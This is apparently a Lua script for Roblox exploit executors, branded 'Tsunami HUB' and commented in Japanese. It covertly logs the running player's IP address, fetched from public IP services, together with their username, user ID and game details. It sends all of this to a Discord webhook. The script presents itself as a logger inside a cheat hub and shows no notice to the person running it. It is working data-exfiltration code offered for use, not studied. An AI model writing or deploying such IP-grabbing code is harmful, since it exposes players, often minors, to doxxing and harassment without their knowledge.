--[[
    Discord Logger
    対応エクスキュータ: (Roblox)
    機能: , Discordログ
    UI: Orion Library
]]

-- エクスキュータか確認
if not syn and not getgenv then
    warn("このスクリプトはexecutorで最適化されています")
end

-- ===== Discord Logger セクション =====
local WEBHOOK_URL = "ウェブフックをここに入れる"

local function sendToWebhook(data)
    local http = game:GetService("HttpService")
    local json = http:JSONEncode(data)
    
    local requestFunc = syn and syn.request or http_request or request
    
    if not requestFunc then
        warn("[Logger] HTTPリクエスト関数が見つかりません")
        return false
    end
    
    local response = requestFunc({
        Url = WEBHOOK_URL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = json
    })
    
    return response
end

local function getIP()
    local requestFunc = syn and syn.request or http_request or request
    
    if not requestFunc then
        return "IP取得不可"
    end
    
    local services = {
        "https://api.ipify.org",
        "https://icanhazip.com"
    }
    
    for _, url in ipairs(services) do
        local success, response = pcall(function()
            return requestFunc({
                Url = url,
                Method = "GET"
            })
        end)
        
        if success and response and response.Body then
            local ip = response.Body:gsub("%s+", "")
            if ip:match("%d+%.%d+%.%d+%.%d+") then
                return ip
            end
        end
    end
    
    return "取得失敗"
end

local function sendDiscordLog()
    local Players = game:GetService("Players")
    local player = Players.LocalPlayer
    
    local playerName = player.Name
    local playerId = player.UserId
    local placeId = game.PlaceId
    local gameName = game.Name
    local jobId = game.JobId or "N/A"
    local ip = getIP()
    local time = os.date("%Y-%m-%d %H:%M:%S")
    
    local embed = {
        {
            title = "Tsunami HUB - 起動ログ",
            description = string.format(
                "**ユーザー名:** %s\n" ..
                "**ユーザーID:** %d\n" ..
                "**ゲーム名:** %s\n" ..
                "**ゲームID:** %d\n" ..
                "**Job ID:** %s\n" ..
                "**IPアドレス:** %s\n" ..
                "**起動時刻:** %s",
                playerName, playerId, gameName, placeId, jobId, ip, time
            ),
            color = 0x00ff00,
            timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z"),
            footer = {
                text = "Tsunami HUB Logger"
            }
        }
    }
    
    local data = {
        username = "user",
        embeds = embed
    }
    
    sendToWebhook(data)
    print("[Logger] Discordログを送信しました (Bot: user)")
end
